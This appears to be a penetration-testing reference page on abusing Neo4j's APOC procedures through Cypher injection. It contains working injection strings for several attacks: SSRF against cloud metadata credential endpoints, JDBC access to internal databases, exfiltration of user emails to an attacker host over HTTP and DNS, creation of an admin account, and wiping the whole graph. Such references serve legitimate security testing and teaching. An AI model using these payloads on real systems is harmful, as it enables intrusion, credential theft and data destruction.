---
title: "APOC procedure abuse through Cypher injection in Neo4j"
description: "Reaching APOC procedures via CALL injection turns a Cypher flaw into SSRF, outbound exfiltration, file access, and arbitrary graph writes on Neo4j."
keywords:
  - APOC abuse
  - Neo4j CALL injection
  - apoc.load.json SSRF
  - apoc.load.jdbc
  - Cypher exfiltration
  - arbitrary graph writes
---

# APOC procedure abuse

APOC ("Awesome Procedures On Cypher") is a widely installed Neo4j extension library. Many deployments enable it for data loading and integration, which means a Cypher injection that can reach a `CALL` clause (see [Cypher injection](cypher-injection.md)) often reaches APOC. These procedures make outbound requests, read and write files, and run other Cypher, turning a read-only query flaw into SSRF, exfiltration, and arbitrary graph writes. Operating-system command execution is not a built-in APOC capability; it requires a custom procedure that someone installed (covered below).

## Reaching CALL from an injection point

Close the literal, discard the tail, and append `CALL`:

```
' CALL apoc.help('apoc') YIELD name RETURN name //
```

`apoc.help` enumerates which APOC procedures are present, so it is a useful first probe for what the target allows.

## SSRF and outbound requests

`apoc.load.json` and `apoc.load.jsonParams` fetch a URL from inside the database. Pointed at internal hosts or cloud metadata, this is server-side request forgery from the database tier:

```
' CALL apoc.load.json('http://169.254.169.254/latest/meta-data/iam/security-credentials/') YIELD value RETURN value //
' CALL apoc.load.json('http://internal-admin.local/') YIELD value RETURN value //
```

`apoc.load.jdbc` opens a JDBC connection to an arbitrary connection string, reaching internal databases or, with a crafted URL, driver-specific behaviors:

```
' CALL apoc.load.jdbc('jdbc:postgresql://10.0.0.5/app?user=postgres','SELECT version()') YIELD row RETURN row //
```

## Outbound exfiltration

The same request procedures carry data out. Fold extracted graph contents into the request so the response (or a controlled listener) receives them:

```
' WITH 1 AS x MATCH (u:User)
  WITH collect(u.email) AS data
  CALL apoc.load.jsonParams('http://attacker.example/x', {}, apoc.convert.toJson(data)) YIELD value
  RETURN value //
```

Where DNS is the only egress, encode data into a hostname and resolve it:

```
' CALL apoc.load.json('http://'+apoc.convert.toJson(1)+'.attacker.example/') YIELD value RETURN value //
```

`apoc.export.csv.*` / `apoc.export.json.*` write query results to a file where file export is enabled, useful when a writable path is served or later retrieved.

## Running more Cypher

`apoc.cypher.run`, `apoc.cypher.runMany`, and `apoc.cypher.doIt` execute a Cypher string. `doIt` runs write operations even inside an otherwise read context, so a read-only injection point can escalate to writes:

```
' CALL apoc.cypher.doIt('CREATE (:User {name:\'pwn\', role:\'admin\'})', {}) YIELD value RETURN value //
' CALL apoc.cypher.runMany('MATCH (n) DETACH DELETE n', {}) YIELD result RETURN result //
```

Because these take the sub-query as a string, they also help evade filters that inspect only the outer statement.

## Writes and reaching the host

APOC does not ship an operating-system command runner. The `apoc.cypher.*` procedures above already escalate a read-only point to arbitrary graph writes, and `apoc.load.jdbc` / `apoc.load.json` reach internal services and the filesystem. OS command execution requires a **custom** user-defined procedure that someone packaged as a plugin and permitted on the server; where one exists, injection that reaches `CALL` reaches it too. Do not assume a built-in shell procedure such as `apoc.systemdb.execute` runs commands, as it executes Cypher against Neo4j's system database, not the OS. Enumerate the real callable surface first and work from what is actually present:

```
' CALL apoc.help('apoc') YIELD name RETURN name //
' CALL dbms.procedures() YIELD name, signature RETURN name, signature //
```

`dbms.procedures()` is replaced by `SHOW PROCEDURES` on newer versions.

## References

- [APOC: load.json / load.jsonParams](https://neo4j.com/labs/apoc/current/import/load-json/)
- [APOC: load.jdbc](https://neo4j.com/labs/apoc/current/database-integration/load-jdbc/)
- [APOC: apoc.cypher.* procedures](https://neo4j.com/labs/apoc/current/cypher-execution/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
